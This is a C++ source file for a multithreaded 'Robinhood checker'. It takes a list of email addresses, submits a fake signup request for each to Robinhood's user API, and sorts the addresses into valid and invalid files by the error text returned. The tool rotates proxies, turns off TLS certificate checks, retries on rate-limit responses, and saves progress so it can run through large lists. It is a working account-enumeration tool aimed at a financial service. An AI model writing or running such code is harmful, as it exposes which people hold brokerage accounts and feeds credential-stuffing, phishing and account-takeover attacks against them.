#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <chrono>
#include <random>
#include <curl/curl.h>
#include <nlohmann/json.hpp>
#include <iomanip>
#include <ctime>
#include <map>
#include <queue>
#include <condition_variable>

using json = nlohmann::json;

// ==================== CONFIGURATION ====================
struct Config {
    std::string proxy;
    int threads = 1;
    bool debug = false;
};

struct Stats {
    std::atomic<int> valids{0};
    std::atomic<int> invalids{0};
    std::atomic<int> errors{0};
    std::atomic<int> processed{0};
    std::atomic<int> total{0};
    std::atomic<int> startLine{0};
};

Config config;
Stats stats;
std::string sessionDir = "sessions";
std::string progressFile = "progress.json";
std::mutex debugMutex;
std::ofstream debugFile;
std::atomic<bool> stopWorkers{false};
std::atomic<bool> finishedReading{false};
std::atomic<int> currentLineNumber{0};

// Work queue (puede crecer sin límite)
std::queue<std::string> workQueue;
std::mutex queueMutex;
std::condition_variable queueCV;

// ==================== UTILITIES ====================

std::string getCurrentTime() {
    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    std::tm tm;
#ifdef _WIN32
    localtime_s(&tm, &time_t);
#else
    localtime_r(&time_t, &tm);
#endif
    std::ostringstream oss;
    oss << std::put_time(&tm, "%H:%M:%S");
    return oss.str();
}

std::string generateRandomString(int n) {
    static const std::string letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, letters.size() - 1);
    
    std::string result;
    for (int i = 0; i < n; i++) {
        result += letters[dis(gen)];
    }
    return result;
}

// ==================== PROGRESS MANAGEMENT ====================

int loadProgress() {
    std::ifstream file(progressFile);
    if (!file.is_open()) {
        return 0;
    }
    
    try {
        json j;
        file >> j;
        if (j.contains("last_line")) {
            return j["last_line"].get<int>();
        }
    } catch (...) {
        return 0;
    }
    return 0;
}

void saveProgress(int lineNumber) {
    json j;
    j["last_line"] = lineNumber;
    j["last_update"] = getCurrentTime();
    j["total_processed"] = stats.processed.load();
    j["valids"] = stats.valids.load();
    j["invalids"] = stats.invalids.load();
    j["errors"] = stats.errors.load();
    
    std::ofstream file(progressFile);
    if (file.is_open()) {
        file << j.dump(4) << std::endl;
    }
}

// ==================== HTTP REQUESTS ====================

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
    size_t totalSize = size * nmemb;
    userp->append((char*)contents, totalSize);
    return totalSize;
}

std::string httpRequest(const std::string& url, const std::string& method, 
                        const std::string& body, const std::map<std::string, std::string>& headers,
                        int& statusCode) {
    CURL* curl = curl_easy_init();
    std::string response;
    
    if (!curl) {
        return "";
    }
    
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    if (method == "POST") {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
    } else if (method == "PUT") {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PUT");
    }
    
    if (!body.empty()) {
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
    }
    
    struct curl_slist* headerList = nullptr;
    for (const auto& h : headers) {
        std::string header = h.first + ": " + h.second;
        headerList = curl_slist_append(headerList, header.c_str());
    }
    
    if (headerList) {
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerList);
    }
    
    if (!config.proxy.empty()) {
        curl_easy_setopt(curl, CURLOPT_PROXY, config.proxy.c_str());
    }
    
    CURLcode res = curl_easy_perform(curl);
    
    if (res == CURLE_OK) {
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &statusCode);
    } else {
        statusCode = 0;
    }
    
    curl_slist_free_all(headerList);
    curl_easy_cleanup(curl);
    
    return response;
}

// ==================== ROBINHOOD CHECKERS ====================

std::string checkEmailRobinhood(const std::string& email) {
    int maxRetries = 3;
    
    for (int retry = 0; retry < maxRetries; retry++) {
        std::map<std::string, std::string> headers;
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        headers["Pragma"] = "no-cache";
        headers["Accept"] = "*/*";
        headers["Content-Type"] = "application/json";
        
        json payload = {
            {"email", email},
            {"first_name", "Test"},
            {"last_name", "User"},
            {"password", "TestPass123@@,"},
            {"username", "testuser123@gmail.com"},
            {"origin", {{"locality", "US"}}}
        };
        
        std::string body = payload.dump();
        int statusCode;
        std::string response = httpRequest("https://api.robinhood.com/user/", "PUT", body, headers, statusCode);
        
        if (config.debug) {
            std::lock_guard<std::mutex> lock(debugMutex);
            debugFile << "[" << getCurrentTime() << "] [email " << email << "] Status: " << statusCode << std::endl;
        }
        
        if (statusCode == 403 || statusCode == 429) {
            std::this_thread::sleep_for(std::chrono::seconds(2));
            continue;
        }
        
        if (response.find("\"email\":[\"Unable to process your request.\"]") != std::string::npos) {
            return "valid";
        }
        
        if (response.find("detail\":\"Signup failed. Try again later.") != std::string::npos) {
            return "invalid";
        }
        
        if (statusCode >= 200 && statusCode < 300) {
            return "valid";
        }
        
        return "invalid";
    }
    
    return "error";
}

std::string checkPhoneRobinhood(const std::string& phone) {
    return "invalid";
}

std::string checkRobinhood(const std::string& input, const std::string& type) {
    if (type == "email") {
        return checkEmailRobinhood(input);
    }
    return checkPhoneRobinhood(input);
}

// ==================== FILE OPERATIONS ====================

void saveResult(const std::string& filename, const std::string& line) {
    std::string path = sessionDir + "/" + filename;
    std::ofstream file(path, std::ios::app);
    if (file.is_open()) {
        file << line << std::endl;
    }
}

void loadConfig() {
    std::ifstream file("config.json");
    if (!file.is_open()) {
        config.threads = 1;
        config.debug = false;
        return;
    }
    
    json j;
    file >> j;
    
    if (j.contains("proxy")) config.proxy = j["proxy"];
    if (j.contains("threads")) config.threads = j["threads"];
    if (j.contains("debug")) config.debug = j["debug"];
    
    if (config.threads == 0) config.threads = 1;
}

int countTotalLines(const std::string& filename) {
    std::ifstream file(filename);
    if (!file.is_open()) return 0;
    
    int count = 0;
    std::string line;
    while (std::getline(file, line)) {
        line.erase(0, line.find_first_not_of(" \t\r\n"));
        line.erase(line.find_last_not_of(" \t\r\n") + 1);
        if (!line.empty()) {
            count++;
        }
    }
    return count;
}

// ==================== FILE READER THREAD (SIN BACKPRESSURE) ====================

void fileReaderThread(const std::string& filename, const std::string& type) {
    std::ifstream file(filename);
    if (!file.is_open()) {
        std::cerr << "Error: Cannot open " << filename << std::endl;
        finishedReading = true;
        queueCV.notify_all();
        return;
    }
    
    int startLine = loadProgress();
    stats.startLine = startLine;
    
    std::cout << "\n[INFO] Resuming from line: " << startLine << std::endl;
    
    std::string line;
    int lineNumber = 0;
    int skipped = 0;
    int queued = 0;
    
    // Skip already processed lines
    while (lineNumber < startLine && std::getline(file, line)) {
        lineNumber++;
        if (!line.empty() && line.find_first_not_of(" \t\r\n") != std::string::npos) {
            skipped++;
        }
    }
    
    // Process remaining lines - SIN BACKPRESSURE (nunca se pausa)
    while (std::getline(file, line)) {
        if (stopWorkers) break;
        
        lineNumber++;
        currentLineNumber = lineNumber;
        
        line.erase(0, line.find_first_not_of(" \t\r\n"));
        line.erase(line.find_last_not_of(" \t\r\n") + 1);
        
        if (line.empty()) continue;
        
        // Add to queue - NO WAIT, never pauses
        {
            std::lock_guard<std::mutex> lock(queueMutex);
            workQueue.push(line);
            queued++;
        }
        queueCV.notify_one();
        
        // Save progress every 100 lines
        if (lineNumber % 100 == 0) {
            saveProgress(lineNumber);
        }
    }
    
    saveProgress(lineNumber);
    
    std::cout << "\n[INFO] File read. Skipped: " << skipped << " | New items: " << queued << std::endl;
    finishedReading = true;
    queueCV.notify_all();
}

// ==================== WORKER THREAD ====================

void workerThread(const std::string& type) {
    while (!stopWorkers || !workQueue.empty()) {
        std::string input;
        {
            std::unique_lock<std::mutex> lock(queueMutex);
            queueCV.wait(lock, []{ return !workQueue.empty() || finishedReading || stopWorkers; });
            
            if (stopWorkers) break;
            if (workQueue.empty() && finishedReading) break;
            if (workQueue.empty()) continue;
            
            input = workQueue.front();
            workQueue.pop();
        }
        
        std::string status = checkRobinhood(input, type);
        
        if (status == "valid") {
            stats.valids++;
            saveResult("valids.txt", input);
        } else if (status == "invalid") {
            stats.invalids++;
            saveResult("invalids.txt", input);
        } else {
            stats.errors++;
            saveResult("errors.txt", input);
        }
        
        stats.processed++;
    }
}

// ==================== MAIN ====================

int main() {
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    // Create sessions directory
#ifdef _WIN32
    CreateDirectoryA(sessionDir.c_str(), NULL);
#else
    mkdir(sessionDir.c_str(), 0755);
#endif
    
    loadConfig();
    
    if (config.debug) {
        debugFile.open("debug.txt", std::ios::app);
    }
    
    // Count total lines
    int totalLines = countTotalLines("input.txt");
    if (totalLines == 0) {
        std::cout << "Error: input.txt is empty or doesn't exist" << std::endl;
        curl_global_cleanup();
        return 1;
    }
    
    stats.total = totalLines;
    int startLine = loadProgress();
    
    std::cout << "========================================" << std::endl;
    std::cout << "     ROBINHOOD CHECKER" << std::endl;
    std::cout << "========================================" << std::endl;
    std::cout << "Threads: " << config.threads << std::endl;
    std::cout << "Proxy: " << (config.proxy.empty() ? "OFF" : "ON") << std::endl;
    std::cout << "Total lines: " << totalLines << std::endl;
    std::cout << "Resuming from line: " << startLine << std::endl;
    std::cout << "Remaining: " << (totalLines - startLine) << std::endl;
    std::cout << "========================================" << std::endl;
    std::cout << "\nPress Ctrl+C to stop..." << std::endl;
    std::cout << "\nProcessing: " << std::flush;
    
    // Start reader thread
    std::thread reader(fileReaderThread, "input.txt", "email");
    
    // Start workers
    std::vector<std::thread> workers;
    for (int i = 0; i < config.threads; i++) {
        workers.emplace_back(workerThread, "email");
    }
    
    // Progress monitor
    auto startTime = std::chrono::steady_clock::now();
    int lastProcessed = 0;
    int lastSaveLine = 0;
    
    while (!finishedReading || !workQueue.empty()) {
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        
        auto now = std::chrono::steady_clock::now();
        double elapsed = std::chrono::duration<double>(now - startTime).count();
        double cpm = elapsed > 0 ? (stats.processed / elapsed) * 60 : 0;
        
        int remaining = (totalLines - currentLineNumber);
        double eta = remaining > 0 && cpm > 0 ? (remaining / cpm) * 60 : 0;
        
        // Display progress (sin mostrar Queue)
        std::cout << "\rProcessing: " << stats.processed << "/" << (totalLines - startLine)
                  << " | Valid: " << stats.valids 
                  << " | Invalid: " << stats.invalids 
                  << " | Errors: " << stats.errors
                  << " | Line: " << currentLineNumber
                  << " | CPM: " << std::fixed << std::setprecision(0) << cpm
                  << " | ETA: " << (int)eta << "s     " << std::flush;
        
        // Save progress every 50 lines
        if (currentLineNumber - lastSaveLine >= 50) {
            saveProgress(currentLineNumber);
            lastSaveLine = currentLineNumber;
        }
        
        if (stats.processed != lastProcessed) {
            lastProcessed = stats.processed;
        }
    }
    
    // Wait for workers to finish
    stopWorkers = true;
    queueCV.notify_all();
    
    for (auto& t : workers) {
        if (t.joinable()) t.join();
    }
    if (reader.joinable()) reader.join();
    
    // Final save
    saveProgress(currentLineNumber);
    
    // Final result
    std::cout << "\n\n========================================" << std::endl;
    std::cout << "           FINAL RESULTS" << std::endl;
    std::cout << "========================================" << std::endl;
    std::cout << "Total processed: " << stats.processed << std::endl;
    std::cout << "Valid:   " << stats.valids << std::endl;
    std::cout << "Invalid: " << stats.invalids << std::endl;
    std::cout << "Errors:  " << stats.errors << std::endl;
    std::cout << "Last line: " << currentLineNumber << std::endl;
    std::cout << "========================================" << std::endl;
    std::cout << "\nResults saved in folder: " << sessionDir << std::endl;
    std::cout << "Progress saved in: " << progressFile << std::endl;
    
    curl_global_cleanup();
    
    std::cout << "\nPress Enter to exit...";
    std::cin.get();
    
    return 0;
}